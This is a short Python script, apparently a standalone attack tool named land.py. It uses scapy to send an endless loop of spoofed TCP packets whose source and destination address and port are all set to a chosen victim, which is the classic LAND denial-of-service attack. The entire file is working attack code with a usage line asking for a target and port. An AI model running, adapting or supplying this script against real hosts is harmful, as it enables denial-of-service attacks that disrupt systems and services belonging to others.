#!/usr/bin/env python
#author Aiden

import socket, random, sys,re 
from scapy.all import *

if len(sys.argv) != 3:
	print "Usage: land.py <target> <port>"
	sys.exit(1) 
victim = sys.argv[1]
port = int(sys.argv[2])
sys.tracebacklimit=0

class attack:
	try:
		def check(self):
			global target,victim
			rep = victim.replace('.','')
			check = rep.isdigit()
			if check == True:
				target = victim 
			elif check == False and 'http'or'https' in victim:
				if victim.count("/")==2:
					victim = victim + "/"
				m = re.search('(https?\://)?([^/]*)/?.*', victim)
				host = m.group(2)
				target = socket.gethostbyname(host)

		def run(self):
			self.check()
			i=IP()
			i.dst=target
			i.src=target

			t=TCP()
			t.dport=port
			t.sport=port

			send(i/t)
	except KeyboardInterrupt:
		sys.exit(1)
	except:
		print 'Victim not available!'
		sys.exit(1)

land = attack()
while True:
	land.run()